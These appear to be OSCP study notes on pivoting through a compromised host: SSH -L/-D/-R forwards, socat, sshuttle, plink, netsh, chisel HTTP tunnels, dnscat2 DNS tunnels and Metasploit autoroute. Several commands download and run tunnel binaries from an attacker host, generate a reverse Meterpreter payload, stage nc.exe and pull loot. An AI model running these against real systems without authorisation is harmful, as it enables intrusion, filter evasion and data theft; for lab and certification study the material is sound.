# Port Redirection & Tunnelling

- Module: PEN-200 / Module 19 — Port Redirection and SSH Tunneling + Module 20 — Tunneling Through Deep Packet Inspection (OSCP)
- URL (M19): https://portal.offsec.com/courses/pen-200-44065/learning/port-redirection-and-ssh-tunneling-48849
- URL (M20): https://portal.offsec.com/courses/pen-200-44065/learning/tunneling-through-deep-packet-inspection-47825

> Terminal output is omitted; only the commands you type are captured.
> **Placeholders** — `{{LHOST}}` your Kali IP (the box that runs the SSH/chisel/dnscat **server** side, and the target of any `-R`), `{{TARGET_IP}}` the final internal host/service you want to reach, `{{USERNAME}}`/`{{PASSWORD}}` creds for a host you can SSH into. Non-brace placeholders describe the pivot chain: `<PIVOT_IP>` = the compromised dual-homed host you already have a shell on and route *through*; `<DEEP_IP>` = a deeper host the pivot can SSH to. Ports (`4455`, `2345`, `9999`, `1080`, `8080`, `2222`…) are **arbitrary examples** — pick your own.

> **🎯 Reach for these first in the OSCP:** **[chisel](#d1--http-tunnelling-with-chisel)** (reverse SOCKS, works even through egress filtering) · **[ssh -D + proxychains](#b2--dynamic--d-socks)** (whole-subnet SOCKS when you have creds) · **[ssh -L](#b1--local--l)** (one-service quick bridge) · **[sshuttle](#b5--sshuttle)** (transparent subnet routing, no proxychains). Everything else is situational.

> **⚡ Quick jump:** [The one decision](#the-one-decision--which-technique) · [SSH -L/-D/-R cheat](#ssh-forwarding-cheat-sheet) · [socat](#a2--socat-port-forward) · [ssh -L](#b1--local--l) · [ssh -D](#b2--dynamic--d-socks) · [ssh -R](#b3--remote--r) · [sshuttle](#b5--sshuttle) · [ssh.exe](#c1--sshexe-windows) · [plink](#c2--plink-windows) · [netsh](#c3--netsh-windows) · [net use](#c4--net-use-reach-another-windows-boxs-shares) · [chisel](#d1--http-tunnelling-with-chisel) · [dnscat2](#d2--dns-tunnelling-with-dnscat2) · [keeping tunnels alive](#e--keeping-tunnels-alive) · [**proxychains triage**](#g--pivot-triage-why-isnt-my-proxychains-working)

---

# 19.1 — Why redirect & tunnel? (the mental model)

A **flat** network lets every host talk to every other — poor security, great for us. Real
targets are **segmented**: a compromised host sits in one zone (e.g. a **DMZ**) and can reach an
internal zone your Kali **cannot** route to directly. The dual-homed host you own becomes your
**pivot**.

Two distinct problems, two families of technique:

| Problem | You need… | Tools |
|---|---|---|
| Kali can't **route** to an internal subnet, but the pivot can | **Port forwarding / tunnelling** — bend a connection through the pivot | socat, `ssh -L/-D/-R`, sshuttle, plink, netsh |
| A **firewall / deep-packet-inspection (DPI)** device only lets **HTTP or DNS** out | **Protocol tunnelling** — hide your traffic inside HTTP or DNS | chisel (HTTP), dnscat2 (DNS) |

**The running lab scenario** (keep this picture in your head):

```
Kali ──WAN─→ CONFLUENCE01 ──DMZ─→ PGDATABASE01 ──internal─→ 172.16.50.0/24
 you       pivot (dual-homed)   deeper host (creds)      final targets (SMB 445, etc.)
           192.168.50.63 /       10.4.50.215 /
           10.4.50.x             172.16.50.x
```

We land RCE on CONFLUENCE01 (Confluence CVE-2022-26134), find PostgreSQL creds + the DMZ, and
must pivot deeper. Each technique below solves one hop of that chain.

---

## The one decision — which technique

Ask, in order:

1. **Can Kali make an inbound connection to a port I bind on the pivot?**
   (No firewall in front of the pivot.) → **Local (`-L`)** or **Dynamic (`-D`)** forward, or **socat**.
2. **Is inbound to the pivot blocked, but the pivot can connect *out* to me?**
   → **Remote (`-R`)** forward — the pivot dials back to Kali.
3. **Do I want to reach a *whole subnet*, not one port?** → **Dynamic (`-D`) + proxychains**, or **sshuttle** (transparent, no proxychains).
4. **Does DPI only allow HTTP / DNS out?** → **chisel** (HTTP) / **dnscat2** (DNS).
5. **Is the pivot Windows?** → **ssh.exe**, **plink.exe**, or **netsh** (all under §C).

---

## SSH forwarding cheat sheet

The single most-confused topic. Fix the mnemonic: **the flag names the side the *listening port* opens on.**

| Flag | Listening port opens on… | Command shape | Reach |
|---|---|---|---|
| **`-L` Local** | **the machine you run ssh from** | `ssh -N -L [bind:]LPORT:DEST:DPORT user@next_hop` | one `DEST:DPORT` the *next hop* can see |
| **`-D` Dynamic** | **the machine you run ssh from** | `ssh -N -D [bind:]LPORT user@next_hop` | **anything** the next hop can see (SOCKS + proxychains) |
| **`-R` Remote** | **the *other* end (the ssh server you connect to)** | `ssh -N -R [bind:]RPORT:DEST:DPORT user@{{LHOST}}` | one `DEST:DPORT`, exposed **on {{LHOST}}** |
| **`-R RPORT` Remote-dynamic** | **the *other* end** | `ssh -N -R RPORT user@{{LHOST}}` | **anything**, SOCKS **on {{LHOST}}** (+ proxychains) |

- `-N` = don't run a remote shell (tunnel only). Add `-f` to background it.
- **Bind to `0.0.0.0`** when a *third* machine (your Kali) must reach the port — by default forwards bind to loopback only.
- **`-L`/`-D`** = you *pull* a connection through a host you can SSH **into**.
  **`-R`** = a host SSHes **out to you** and *pushes* access back — the go-to when a firewall blocks inbound to the pivot.

---

# A — Port forwarding with Linux tools (socat)

## A.1 — When socat

`socat` is a dumb TCP relay: **listen on a port here, forward every connection to `host:port` there.**
No encryption, no SOCKS — but it needs nothing but the socat binary on the pivot, so it's the
quickest single-port bridge. Use it when you have code-exec on the pivot and just want to expose
**one** internal service.

## A.2 — socat port-forward

Run **on the pivot** (`<PIVOT_IP>` faces Kali; the fork target faces the internal host):

```bash
# expose <DEEP_IP>:5432 (Postgres) as <PIVOT_IP>:2345 — one relay per service/port
socat -ddd TCP-LISTEN:2345,fork TCP:<DEEP_IP>:5432
```

Then from Kali, hit the pivot's port as if it were the service:

```bash
psql -h <PIVOT_IP> -p 2345 -U postgres
```

Relay SSH the same way, then SSH straight through it:

```bash
socat TCP-LISTEN:2222,fork TCP:<DEEP_IP>:22          # on the pivot
ssh {{USERNAME}}@<PIVOT_IP> -p2222                    # from Kali
```

> `fork` = handle each new connection in its own child (without it socat dies after one). `-ddd`
> just raises verbosity. `TCP-LISTEN:P,fork` ⟶ `TCP:host:P` is the whole idiom.

---

# B — SSH tunnelling

> Precondition for all four: you can `ssh` from one hop to the next with creds/keys. In the lab we
> reach a shell on CONFLUENCE01 and hold `database_admin` creds for PGDATABASE01.

## B.1 — Local (`-L`)

**Use when Kali *can* connect inbound to a port on the pivot** (no firewall in front of it).
Run the forward **on the pivot**, binding `0.0.0.0` so Kali can reach it, tunnelling to a service
the *next hop* (PGDATABASE01) can see:

```bash
# forwarding rule format:  [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT
# on the pivot — open 4455 on ALL its interfaces, forward to internal SMB via the deep host
ssh -N -L 0.0.0.0:4455:{{TARGET_IP}}:445 {{USERNAME}}@<DEEP_IP>
```

From Kali, talk to the pivot's WAN IP on the forwarded port:

```bash
smbclient -p 4455 -L //<PIVOT_IP>/ -U hr_admin
smbclient -p 4455 //<PIVOT_IP>/scripts -U hr_admin
```

> Verify the listener came up with `ss -ntplu` (look for `0.0.0.0:4455`). One `-L` = one destination
> host:port. To reach many, use `-D` below.

## B.2 — Dynamic (`-D`, SOCKS)

**Use to reach *any* host:port the next hop can see, through one tunnel.** `-D` turns SSH into a
**SOCKS proxy**; you then drive tools through it with **proxychains**.

```bash
# on the pivot: open a SOCKS proxy on 9999 (all interfaces), routed via the deep host
ssh -N -D 0.0.0.0:9999 {{USERNAME}}@<DEEP_IP>
```

Point proxychains at that SOCKS port (edit `/etc/proxychains4.conf`, last line):

```bash
tail /etc/proxychains4.conf
# [ProxyList]
# socks5 <PIVOT_IP> 9999
```

Now prefix any TCP tool with `proxychains` (use `-sT` full-connect + `-Pn` — SOCKS can't do raw/ICMP):

```bash
proxychains smbclient -L //{{TARGET_IP}}/ -U hr_admin
proxychains nmap -vvv -sT -Pn -n --top-ports=20 {{TARGET_IP}}
```

## B.3 — Remote (`-R`)

**Use when inbound to the pivot is firewalled** — the pivot can't accept your connection, so it
**connects out to Kali** and opens the listening port **on Kali** instead. First make sure Kali is
running an SSH server:

```bash
sudo systemctl start ssh            # on Kali — the pivot will SSH INTO this
```

Then **from the pivot**, dial back to Kali and expose a deep service on Kali's loopback:

```bash
# on the pivot: bind 2345 on KALI, forward it through the pivot to <DEEP_IP>:5432
ssh -N -R 127.0.0.1:2345:<DEEP_IP>:5432 {{USERNAME}}@{{LHOST}}
```

Now the service looks local to Kali:

```bash
ss -ntplu                            # confirm 127.0.0.1:2345 is listening on Kali
psql -h 127.0.0.1 -p 2345 -U postgres
```

## B.4 — Remote dynamic (`-R` with a bare port)

Remote forward + SOCKS: give `-R` a **single port** and no destination → a SOCKS proxy opens **on
Kali**, tunnelled out through the (firewalled) pivot. Best of both: reverse *and* whole-subnet.

```bash
# on the pivot: open SOCKS on Kali:9998, egress via the pivot
ssh -N -R 9998 {{USERNAME}}@{{LHOST}}
```

Config proxychains to the **local** SOCKS and go:

```bash
sudo ss -ntplu                       # confirm 127.0.0.1:9998 on Kali
tail /etc/proxychains4.conf          # last line:  socks5 127.0.0.1 9998
proxychains nmap -vvv -sT -Pn -n --top-ports=20 {{TARGET_IP}}
```

> Requires OpenSSH ≥ 7.6 on the client (older builds ignore the dynamic form of `-R`).

## B.5 — sshuttle

**A "poor man's VPN": transparent routing of whole subnets through an SSH connection — no
proxychains, no per-port forwards.** You just name the subnets and use tools normally. Needs Python
on the pivot and root on Kali. Requirement: a **direct SSH** reachability to the pivot — so if the
pivot's SSH isn't directly reachable, relay it first with socat:

```bash
socat TCP-LISTEN:2222,fork TCP:<DEEP_IP>:22          # on the pivot (if needed)
```

Then, from Kali, route the internal subnets through it:

```bash
sshuttle -r {{USERNAME}}@<PIVOT_IP>:2222 10.4.50.0/24 172.16.50.0/24
```

Now tools run **untunnelled-looking** — no proxychains prefix:

```bash
smbclient -L //{{TARGET_IP}}/ -U hr_admin --password=Welcome1234
```

> sshuttle can't forward non-TCP and doesn't help against DPI (it's still SSH on the wire). It's the
> friendliest option when you have clean SSH access and want to "just reach the subnet".

---

# C — Port forwarding with Windows tools

When the pivot is **Windows**, `socat`/native `ssh -L` may be unavailable. Three options:

## C.1 — ssh.exe (Windows)

Modern Windows 10/Server ship OpenSSH — `ssh.exe` behaves exactly like Linux ssh. After RDPing in
(`xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:<PIVOT_IP>`) and starting `sshd` on Kali:

```cmd
ssh.exe -V
:: remote-dynamic SOCKS back to Kali, straight from Windows
ssh -N -R 9998 {{USERNAME}}@{{LHOST}}
```

## C.2 — plink (Windows)

`plink.exe` (PuTTY's CLI) for older Windows without OpenSSH. Host it over HTTP from Kali, pull it to
the target, then reverse-forward. Classic use: expose the Windows box's own **RDP** back to Kali.

```bash
# on Kali: serve plink.exe
sudo systemctl start apache2
find / -name plink.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

```cmd
:: on the Windows target (e.g. via web RCE) — download then reverse-forward
powershell wget -Uri http://{{LHOST}}/plink.exe -OutFile C:\Windows\Temp\plink.exe
C:\Windows\Temp\plink.exe -ssh -l {{USERNAME}} -pw {{PASSWORD}} -R 127.0.0.1:9833:127.0.0.1:3389 {{LHOST}}
```

Kali can now RDP to itself on 9833 to reach the target's 3389. (`-batch` avoids the host-key prompt
hanging a non-interactive shell.)

## C.3 — netsh (Windows)

Built-in **`portproxy`** — no extra binary. Needs **local admin**. Pure relay like socat (listen
here → connect there). You must also open the firewall for the listen port, and remember to clean up.

```cmd
:: add relay: listen on the pivot's IP:2222 → forward to <DEEP_IP>:22
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<PIVOT_IP> connectport=22 connectaddress=<DEEP_IP>
netsh interface portproxy show all

:: allow it through the host firewall
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<PIVOT_IP> localport=2222 action=allow
```

From Kali, reach the relayed service:

```bash
sudo nmap -sS <PIVOT_IP> -Pn -n -p2222
```

Clean up when done (portproxy + firewall rule both persist across reboots):

```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<PIVOT_IP>
```

## C.4 — net use (reach another Windows box's shares)

Often the *point* of a Windows pivot isn't a fancy tunnel — it's reaching a **deeper Windows host's
SMB** to enumerate shares, drop tools, or read loot. If you have command execution on a Windows
pivot that can already route to the deep host, run `net use` **directly on the pivot** — no tunnel
needed. SMB is pinned to 445, so it does **not** port-forward cleanly; the clean move is to `net use`
from a box that can reach the target on 445 (the pivot itself, or over an `-D`/chisel SOCKS with
proxychains — never a plain single-port `-L`).

```cmd
:: mount a share from the pivot to the deeper Windows host, using found creds
net use \\{{TARGET_IP}}\C$ /user:{{USERNAME}} {{PASSWORD}}
net use \\{{TARGET_IP}}\share /user:CORP\{{USERNAME}} {{PASSWORD}}   :: domain\user form

:: enumerate / read once mounted
net use                                     :: list current mappings
dir \\{{TARGET_IP}}\C$\Users
copy \\{{TARGET_IP}}\C$\loot.txt .          :: pull a file
copy nc.exe \\{{TARGET_IP}}\C$\Windows\Temp\    :: stage a tool onto the target

:: null-session probe (no creds), then map to a drive letter
net use \\{{TARGET_IP}}\IPC$ "" /user:""
net use Z: \\{{TARGET_IP}}\share /user:{{USERNAME}} {{PASSWORD}}

:: clean up the mappings you made
net use \\{{TARGET_IP}}\C$ /delete
net use * /delete /y                        :: drop them all
```

> Reaching it **over SOCKS**: because `net use` can't be told a custom port, proxychains a *Linux*
> SMB client instead (`proxychains smbclient //{{TARGET_IP}}/C$ -U {{USERNAME}}`), or run the
> `net use` from the pivot where 445 is directly reachable. From Kali, `nxc smb {{TARGET_IP}} -u
> {{USERNAME}} -p {{PASSWORD}} --shares` through proxychains is usually the smoother path than
> forwarding SMB.

---

# D — Tunnelling through deep packet inspection (Module 20)

Everything above is still recognisably SSH/raw TCP on the wire. A **DPI**/egress-filtering device
can block that outright, allowing only **HTTP** or **DNS** out. Answer: wrap our tunnel inside a
protocol the firewall trusts.

## D.1 — HTTP tunnelling with chisel

**chisel** builds an HTTP-formatted, SSH-encrypted tunnel and exposes a **SOCKS proxy on Kali** —
so all traffic looks like HTTP and sails through DPI. Kali runs the **server** (`--reverse`); the
compromised host runs the **client** with `R:socks`.

Stage the binary and start the server on Kali:

```bash
sudo cp $(which chisel) /var/www/html/       # host it
sudo systemctl start apache2
chisel server --port 8080 --reverse          # Kali server; SOCKS will listen on 127.0.0.1:1080
```

On the compromised host (e.g. via RCE), fetch chisel and connect **back** to Kali as a reverse
SOCKS client:

```bash
wget {{LHOST}}/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client {{LHOST}}:8080 R:socks > /dev/null 2>&1 &
```

Kali now has a SOCKS proxy on **127.0.0.1:1080** — point proxychains at it and work as usual:

```bash
tail /etc/proxychains4.conf                  # last line:  socks5 127.0.0.1 1080
proxychains nmap -vvv -sT -Pn -n --top-ports=20 {{TARGET_IP}}
```

> `R:socks` = **reverse** SOCKS (proxy opens on the *server*, i.e. Kali). Everything sent to
> 127.0.0.1:1080 is encapsulated as HTTP, pushed up the tunnel, and forwarded by the client.

Single **port** (not SOCKS) reverse-forward — expose one internal service on a Kali port, handy for a
stable browser session to an internal web app (`R:localport:remotehost:remoteport`):

```bash
/tmp/chisel client {{LHOST}}:8080 R:80:{{TARGET_IP}}:80     # Linux pivot  — Kali:80 -> {{TARGET_IP}}:80
```

```cmd
chisel.exe client {{LHOST}}:8080 R:80:{{TARGET_IP}}:80      :: Windows pivot (upload chisel.exe first)
```

## D.2 — DNS tunnelling with dnscat2

When even HTTP is blocked but the network resolves **DNS**, tunnel over DNS. **dnscat2** runs a
server on the host that is **authoritative for a domain** you control (`feline.corp`); the target
runs the client, encoding data into DNS queries for sub-domains of that zone.

Server side — on your authoritative NS (verify traffic actually arrives on UDP/53, then start it):

```bash
sudo tcpdump -i ens192 udp port 53           # confirm the DNS queries reach you
dnscat2-server feline.corp                    # note the --secret it prints
```

Client side — on the compromised host:

```bash
cd dnscat/
./dnscat feline.corp                          # or: ./dnscat --dns server={{LHOST}},port=53 --secret=<SECRET>
```

Back in the **dnscat2 server console**, attach to the new session and port-forward over DNS
(`listen` works like `ssh -L`):

```
dnscat2> windows                              # list sessions
dnscat2> window -i 1                           # interact with session 1
command (host) 1> listen 127.0.0.1:4455 {{TARGET_IP}}:445
```

Now hit the forwarded port from the DNS-server box:

```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

> DNS tunnelling is **slow** (data crammed into DNS labels) — fine for a shell / small port-forward,
> painful for bulk transfer. The `listen [<lhost>:]<lport> <rhost>:<rport>` syntax mirrors `-L`.

---

# E — Keeping tunnels alive

A tunnel is only as stable as the **process carrying it**. A *forwarded* TCP connection is as reliable
as any TCP connection — what actually drops is the carrier. In the OSCP the carrier is usually your
flaky reverse shell, so **the tunnel tech is rarely the weak link; your foothold is.** Robustness
ranking: **netsh portproxy** (survives reboot) > **chisel** (auto-reconnects) > **socat** > **sshuttle**
> **ssh -L/-D/-R** (dies with the SSH session) > **dnscat2** (works, but slow/fragile).

**Top ways they die, and the fix:**

| It died because… | Fix |
|---|---|
| You started the tunnel **inside a netcat shell** and the shell dropped | Get a stable foothold first (SSH/WinRM); background + detach the tunnel (below) |
| Ran `ssh` **without `-N` / in foreground**, then exited the shell | Always `ssh -f -N …`; launch from `tmux`/`screen` on Kali |
| **NAT/firewall idle-timeout** silently killed a quiet tunnel | Keepalives (below) |
| Pivot process was a **child of the exploited service**; it restarted | Migrate to a stable account/service, or use netsh (survives reboot) |
| proxychains "hung" | Not dead — just slow/TCP-only. `-sT -Pn`, one proxy line, be patient |

**Background & detach properly** (so closing your shell doesn't take the tunnel):

```bash
ssh -f -N -D 0.0.0.0:9999 {{USERNAME}}@<DEEP_IP>     # -f self-backgrounds after auth, -N no shell
nohup ssh -N -R 9998 {{USERNAME}}@{{LHOST}} &        # or nohup + & when -f isn't an option
disown                                                # detach the job from the current shell
# best of all: run the whole pivot from a tmux/screen session on Kali so it outlives disconnects
tmux new -s pivot
```

**Keepalives** — stop idle NAT/firewall drops (client-side `ssh`, or system-wide in `~/.ssh/config`):

```bash
ssh -N -D 9999 {{USERNAME}}@<DEEP_IP> \
    -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes
chisel client {{LHOST}}:8080 R:socks --keepalive 25s   # chisel's own keepalive
.\chisel.exe client {{LHOST}}:8080 R:80:{{TARGET_IP}}:80

# To kill strays: 
taskkill /F /IM chisel.exe /IM chisel1.exe /T
```

**Auto-reconnect** — for long/unattended pivots that must ride out blips:

```bash
sudo apt install -y autossh
# autossh respawns the SSH tunnel automatically if it drops (same -L/-D/-R args as ssh)
autossh -M 0 -f -N -R 9998 {{USERNAME}}@{{LHOST}} \
    -o ServerAliveInterval=30 -o ServerAliveCountMax=3
```

> **chisel** already retries on its own, which is why it's the go-to for anything long-running.
> **netsh portproxy** persists across reboots (great for durability — but *remember to clean it up*,
> see §C.3). For quick exam pivots you mostly just need #1 and #2: stable foothold + backgrounded tunnel.

---

# F — Metasploit pivoting (autoroute + SOCKS)

When your foothold is a **Meterpreter** session, Metasploit can route Kali's traffic through it with
no separate tunnel binary — reach for this when you already caught a Meterpreter shell (otherwise
chisel/ssh are lighter). Equivalent to `ssh -D` / chisel `R:socks`.

Stage a Meterpreter payload and catch it (keep the handler up for repeat sessions):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT=443 -f exe -o met.exe
```

```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST {{LHOST}}
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set ExitOnSession false        # survive multiple incoming sessions
msf6 exploit(multi/handler) > run -j                          # background the handler
```

Add routes to the internal subnet (autoroute reads them from the session), then stand up SOCKS:

```
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
msf6 post(multi/manage/autoroute) > run                       # auto-adds the host's subnets as routes

msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j                   # SOCKS5 on 127.0.0.1:1080
```

Point proxychains at `socks5 127.0.0.1 1080` and drive tools through it (`-sT -Pn` for nmap):

```bash
tail /etc/proxychains4.conf                                   # last line:  socks5 127.0.0.1 1080
proxychains -q crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}} --shares
proxychains -q nmap -sT -Pn -p 80,443,445 {{TARGET_IP}}
```

Upload files over the same session (e.g. stage chisel for a browser-stable port-forward):

```
meterpreter > upload chisel.exe C:\\Users\\Public\\chisel.exe
```

> Same proxychains rules apply (SOCKS is TCP-only → `-sT -Pn`, be patient). For a firewalled / DPI
> egress path, prefer **chisel** (§D.1) — it looks like HTTP and auto-reconnects.

---

# G — Pivot triage: "why isn't my proxychains working?"

> A dead pivot burns more OSCP time than any exploit. When proxychains gives `Connection refused`,
> `filtered`, a timeout, or "hangs" — **do not touch the target. Diagnose the path.** These are the
> traps that actually cost hours; run them in order, each rules out one layer.

**0 · Drop `-q` to see where it fails.** `proxychains -q` hides proxychains' own routing lines — the
first thing you need. Remove it:

```bash
proxychains impacket-psexec -hashes …:… {{USERNAME}}@{{TARGET_IP}}
# [proxychains] …127.0.0.1:1080 … OK          → proxy was reached
# [proxychains] …{{TARGET_IP}}:445 <--denied   → proxy is FINE; the TARGET refused that port
# [proxychains] …<--socket error/timeout, or can't reach 1080 → the PROXY itself is dead
```

**1 · Who actually owns your SOCKS port?** (the #1 silent killer)

```bash
ss -ltnp | grep 1080
```

The **process name** must be the tunnel you think is live — `chisel` or `ssh`. If it says **`ruby`**,
that's a leftover **Metasploit `socks_proxy`** (§F) squatting on 1080; a stale `chisel`/`ssh` from a
dead session does the same. proxychains happily talks to whatever holds the port — dead route and all.
Kill the squatter, confirm the port is free, *then* start the real tunnel:

```bash
kill <pid>               # free 1080
ss -ltnp | grep 1080     # MUST be empty before you relaunch chisel R:socks
```

> **Port-collision trap:** if a squatter already holds 1080, chisel's `R:socks` can't bind it and
> quietly lands on another port (or nowhere) — while proxychains keeps hammering the dead one. Always
> clear 1080 *first*.

**2 · Did you build a SOCKS, or just a port-forward?** `R:socks` = subnet-wide SOCKS (what proxychains
needs). `R:80:host:80` = **one** port bridged to **one** service — useless for proxychains and only
reaches that single host:port. Read the chisel **server** log:

```
proxy#R:socks: Listening                 ✅ SOCKS — proxychains works
proxy#R:80⇒172.16.x.x:80: Listening      ❌ port-forward — NOT a SOCKS
```

**3 · Prove the path with a host you OWN.** Before blaming the target, scan the port on a box you
already control (the pivot's own internal IP, another owned host) *next to* the target:

```bash
proxychains -q nmap -sT -Pn -p445 <OWNED_HOST> {{TARGET_IP}}
```

- Owned host `open` → the path works; the problem is target-specific.
- Owned host `filtered` → **the tunnel is broken**, not the target. Go back to steps 1–2.

**4 · Right port? A tool that worked doesn't clear the one that fails.** Kerberoast/LDAP ride 88/389;
psexec/`net use`/secretsdump ride **445**. "My kerberoast worked" proves *nothing* about SMB — they're
different ports. Test the **exact** port your failing tool needs.

**5 · One proxy line only.** `tail /etc/proxychains4.conf` — exactly one uncommented
`socks5 127.0.0.1 <port>`. Old stale lines chain your traffic through dead proxies.

**6 · Clock skew (Kerberos over a pivot).** `KRB_AP_ERR_SKEW(Clock skew too great)` means Kali's clock
is >5 min off the DC and you **can't NTP it through SOCKS** (NTP is UDP; SOCKS is TCP-only). Read the
DC's time over the proxy, then wrap the command in `faketime` (full GetUserSPNs syntax in the
kerberoasting note):

```bash
proxychains -q net time -S {{TARGET_IP}}                       # read the DC clock
faketime 'YYYY-MM-DD HH:MM:SS' proxychains -q impacket-GetUserSPNs -request -dc-ip {{TARGET_IP}} <DOMAIN>/{{USERNAME}}
```

**7 · Still stuck? Skip the pivot.** If you already own a box on the target's subnet (e.g. a
relayed SYSTEM shell on a mail/app server), run the attack **from there** — a local LAN hop beats a
fragile double-SOCKS chain from Kali every time.

> **Golden rule:** a symptom on the *target* is usually a lie about the *path*. `filtered`/`refused`
> on a host you own = fix the tunnel, not the exploit.

---

# 20.3 / 19.5 — Wrapping up

- **Enumerate the pivot from inside first** (`ip addr`, `ip route`, `ss -ntplu`, then sweep the new
  subnet — quiet + parallel so it finishes in seconds and only prints hits):

  ```bash
  # on the pivot (direct). From Kali over a SOCKS -D/chisel tunnel, prefix each nc with `proxychains -q`
  seq 1 254 | xargs -P64 -I{} sh -c 'nc -zw1 <NET>.{} 445 2>/dev/null && echo "<NET>.{}:445 up"'
  ```

  You can't tunnel to what you haven't found. (`nmap -sT -Pn --open -p445` works too, but over a
  fragile SOCKS pivot the parallel `nc` sweep is faster and more reliable — nmap's ETA can balloon
  to an hour.)
- **Match the tool to the constraint**, not habit: inbound-OK → `-L`/`-D`; inbound-blocked → `-R`;
  whole subnet → `-D`+proxychains or sshuttle; DPI HTTP-only → chisel; DNS-only → dnscat2.
- **proxychains rules:** SOCKS is TCP-only → always `-sT -Pn` with nmap; expect slowness; one proxy
  line at a time in `proxychains4.conf`.
- **Clean up** persistent changes (netsh portproxy + firewall rules, backgrounded chisel/ssh procs).
